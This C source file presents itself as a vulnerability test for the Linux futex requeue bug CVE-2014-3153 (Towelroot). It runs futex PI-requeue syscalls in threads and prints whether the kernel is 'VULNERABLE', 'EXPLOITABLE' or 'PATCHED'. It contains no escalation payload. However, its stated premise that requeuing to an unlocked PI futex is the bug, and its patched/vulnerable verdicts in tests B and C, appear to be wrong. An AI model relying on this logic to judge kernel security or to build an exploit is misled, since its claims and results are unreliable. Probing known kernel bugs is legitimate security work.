/*
 * futex_test2.c — Proper CVE-2014-3153 (Towelroot) test
 *
 * Key insight: We must set up futex2 as a VALID PI futex first
 * (lock it with FUTEX_LOCK_PI), then have waiters target it.
 * The vulnerability is about requeuing from a NON-PI wait to a PI futex.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <linux/futex.h>

static int *futex1;  /* non-PI futex (source) */
static int *futex2;  /* PI futex (target) */
static volatile int waiters_ready = 0;
static pthread_mutex_t ready_lock = PTHREAD_MUTEX_INITIALIZER;

/* ========== Waiter thread for requeue test ========== */
static void *waiter_fn(void *arg) {
    int idx = (int)(long)arg;
    struct timespec ts = { .tv_sec = 10, .tv_nsec = 0 };

    pthread_mutex_lock(&ready_lock);
    waiters_ready++;
    pthread_mutex_unlock(&ready_lock);

    /*
     * FUTEX_WAIT_REQUEUE_PI: block on futex1, expecting to be requeued to futex2.
     * val=0 means only block if *futex1 == 0.
     */
    int ret = syscall(SYS_futex, futex1, FUTEX_WAIT_REQUEUE_PI, 0,
                      &ts, futex2, 0);
    int err = errno;

    if (ret == 0) {
        printf("[W%d] Requeued and woken! Unlocking PI futex...\n", idx);
        syscall(SYS_futex, futex2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    } else if (err == 110) {
        printf("[W%d] Timed out (ETIMEDOUT) — never requeued\n", idx);
    } else {
        printf("[W%d] ret=%d errno=%d (%s)\n", idx, ret, err, strerror(err));
    }

    return (void*)(long)ret;
}

/*
 * Test A: Correct PI requeue pattern
 * This should work on both patched and unpatched kernels.
 * Establishes baseline: do PI futexes work at all?
 */
static void test_correct_pattern(void) {
    printf("\n=== Test A: Correct PI Requeue Pattern ===\n");

    *futex1 = 0;
    *futex2 = 0;
    waiters_ready = 0;

    /* Step 1: Lock futex2 as PI (main owns it) */
    int ret = syscall(SYS_futex, futex2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[main] FUTEX_LOCK_PI on futex2: ret=%d, *futex2=%d (my tid=%d)\n",
           ret, *futex2, (int)syscall(SYS_gettid));
    if (ret != 0) {
        printf("[-] Can't lock PI futex, skipping test\n");
        return;
    }

    /* Step 2: Start waiter threads */
    #define N_WAITERS 3
    pthread_t tids[N_WAITERS];
    for (int i = 0; i < N_WAITERS; i++)
        pthread_create(&tids[i], NULL, waiter_fn, (void*)(long)i);

    /* Wait for all waiters to be ready */
    while (1) {
        pthread_mutex_lock(&ready_lock);
        int n = waiters_ready;
        pthread_mutex_unlock(&ready_lock);
        if (n >= N_WAITERS) break;
        usleep(10000);
    }
    usleep(200000); /* Extra time for syscall entry */

    /* Step 3: Requeue waiters from futex1 → futex2 */
    printf("[main] Requeuing: FUTEX_CMP_REQUEUE_PI(futex1 → futex2)...\n");
    ret = syscall(SYS_futex, futex1, FUTEX_CMP_REQUEUE_PI,
                  1,                     /* wake at most 1 */
                  (void*)(long)(N_WAITERS), /* requeue the rest */
                  futex2,                /* PI target */
                  *futex1);              /* expected val at futex1 */
    printf("[main] FUTEX_CMP_REQUEUE_PI: ret=%d, errno=%d (%s)\n",
           ret, errno, strerror(errno));

    if (ret > 0) {
        printf("[+] Requeued %d waiters successfully!\n", ret);
    } else if (ret == 0) {
        printf("[?] 0 waiters requeued — waiters may not have blocked\n");
    } else {
        printf("[-] Failed: %s\n", strerror(errno));
    }

    /* Step 4: Unlock futex2 to wake requeued waiters */
    printf("[main] Unlocking PI futex2...\n");
    ret = syscall(SYS_futex, futex2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    printf("[main] FUTEX_UNLOCK_PI: ret=%d\n", ret);

    /* Also wake anyone still on futex1 */
    syscall(SYS_futex, futex1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);

    usleep(500000);
    for (int i = 0; i < N_WAITERS; i++) {
        void *res;
        struct timespec jts;
        clock_gettime(CLOCK_REALTIME, &jts);
        jts.tv_sec += 5;
        if (pthread_timedjoin_np(tids[i], &res, &jts) != 0) {
            printf("[!] Waiter %d stuck, cancelling\n", i);
            pthread_cancel(tids[i]);
            pthread_join(tids[i], NULL);
        }
    }
}

/*
 * Test B: Vulnerability test — requeue WITHOUT PI lock on target
 * If CVE-2014-3153 is present, this still succeeds.
 * If patched, it returns EINVAL.
 */
static void test_vuln_no_pi_lock(void) {
    printf("\n=== Test B: Vuln Test — Requeue to UNLOCKED target ===\n");

    *futex1 = 0;
    *futex2 = 0;  /* NOT locked as PI */
    waiters_ready = 0;

    pthread_t tids[N_WAITERS];
    for (int i = 0; i < N_WAITERS; i++)
        pthread_create(&tids[i], NULL, waiter_fn, (void*)(long)(i + 10));

    while (1) {
        pthread_mutex_lock(&ready_lock);
        int n = waiters_ready;
        pthread_mutex_unlock(&ready_lock);
        if (n >= N_WAITERS) break;
        usleep(10000);
    }
    usleep(200000);

    printf("[main] Requeuing to UNLOCKED futex2 (vuln test)...\n");
    int ret = syscall(SYS_futex, futex1, FUTEX_CMP_REQUEUE_PI,
                      1, (void*)(long)(N_WAITERS), futex2, *futex1);
    printf("[main] FUTEX_CMP_REQUEUE_PI: ret=%d, errno=%d (%s)\n",
           ret, errno, strerror(errno));

    if (ret > 0) {
        printf("[!!!] BUG PRESENT — requeued %d to non-PI futex!\n", ret);
        printf("[!!!] CVE-2014-3153 IS EXPLOITABLE!\n");
    } else if (ret == 0) {
        printf("[?] 0 requeued — check if waiters blocked\n");
    } else if (errno == EINVAL) {
        printf("[-] EINVAL — kernel validates PI state → PATCHED\n");
    } else {
        printf("[?] Unexpected: errno=%d\n", errno);
    }

    /* Cleanup */
    syscall(SYS_futex, futex1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
    syscall(SYS_futex, futex2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    usleep(500000);

    for (int i = 0; i < N_WAITERS; i++) {
        struct timespec jts;
        clock_gettime(CLOCK_REALTIME, &jts);
        jts.tv_sec += 5;
        if (pthread_timedjoin_np(tids[i], NULL, &jts) != 0) {
            pthread_cancel(tids[i]);
            pthread_join(tids[i], NULL);
        }
    }
}

/*
 * Test C: Direct waiter blocking verification
 * Confirm that FUTEX_WAIT_REQUEUE_PI actually blocks the thread.
 */
static volatile int blocker_state = 0; /* 0=init, 1=entering, 2=returned */

static void *blocker_fn(void *arg) {
    struct timespec ts = { .tv_sec = 10, .tv_nsec = 0 };
    blocker_state = 1;

    int ret = syscall(SYS_futex, futex1, FUTEX_WAIT_REQUEUE_PI, 0,
                      &ts, futex2, 0);
    blocker_state = 2;

    printf("[blocker] ret=%d errno=%d (%s)\n", ret, errno, strerror(errno));
    if (ret == 0) {
        syscall(SYS_futex, futex2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    }
    return NULL;
}

static void test_blocking_verify(void) {
    printf("\n=== Test C: Verify FUTEX_WAIT_REQUEUE_PI blocks ===\n");

    /* First WITH PI lock */
    *futex1 = 0;
    *futex2 = 0;
    blocker_state = 0;

    syscall(SYS_futex, futex2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[main] Locked futex2, *futex2=%d\n", *futex2);

    pthread_t tid;
    pthread_create(&tid, NULL, blocker_fn, NULL);

    while (blocker_state < 1) usleep(1000);
    usleep(200000); /* 200ms for syscall entry */

    printf("[main] After 200ms: blocker_state=%d (1=entering, 2=returned)\n",
           blocker_state);

    if (blocker_state == 1) {
        printf("[+] Waiter IS blocking — good!\n");

        /* Now requeue and unlock */
        int ret = syscall(SYS_futex, futex1, FUTEX_CMP_REQUEUE_PI,
                          1, (void*)1, futex2, 0);
        printf("[main] Requeue: ret=%d\n", ret);

        ret = syscall(SYS_futex, futex2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        printf("[main] Unlock: ret=%d\n", ret);
    } else {
        printf("[-] Waiter returned immediately — NOT blocking\n");
    }

    usleep(200000);
    printf("[main] Final blocker_state=%d\n", blocker_state);

    struct timespec jts;
    clock_gettime(CLOCK_REALTIME, &jts);
    jts.tv_sec += 5;
    if (pthread_timedjoin_np(tid, NULL, &jts) != 0) {
        pthread_cancel(tid);
        pthread_join(tid, NULL);
    }

    /* Now WITHOUT PI lock — does the waiter still block? */
    printf("\n[main] Testing without PI lock on futex2...\n");
    *futex1 = 0;
    *futex2 = 0; /* not locked */
    blocker_state = 0;

    pthread_create(&tid, NULL, blocker_fn, NULL);
    while (blocker_state < 1) usleep(1000);
    usleep(200000);

    printf("[main] After 200ms: blocker_state=%d\n", blocker_state);
    if (blocker_state == 1) {
        printf("[+] Waiter blocks even on non-PI target — VULNERABLE!\n");
    } else {
        printf("[-] Waiter returns immediately on non-PI target — PATCHED\n");
    }

    /* Cleanup */
    syscall(SYS_futex, futex1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
    syscall(SYS_futex, futex2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    usleep(500000);
    struct timespec jts2;
    clock_gettime(CLOCK_REALTIME, &jts2);
    jts2.tv_sec += 5;
    if (pthread_timedjoin_np(tid, NULL, &jts2) != 0) {
        pthread_cancel(tid);
        pthread_join(tid, NULL);
    }
}

int main(void) {
    printf("=== CVE-2014-3153 Futex Requeue Test v2 ===\n");
    printf("[*] pid=%d, tid=%d, uid=%d\n",
           getpid(), (int)syscall(SYS_gettid), getuid());

    futex1 = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                  MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    futex2 = (int*)((char*)futex1 + 128);

    test_blocking_verify();  /* First: verify basic blocking works */
    test_correct_pattern();  /* Then: correct PI requeue */
    test_vuln_no_pi_lock();  /* Finally: vulnerability test */

    printf("\n=== All tests complete ===\n");
    munmap(futex1, 4096);
    return 0;
}
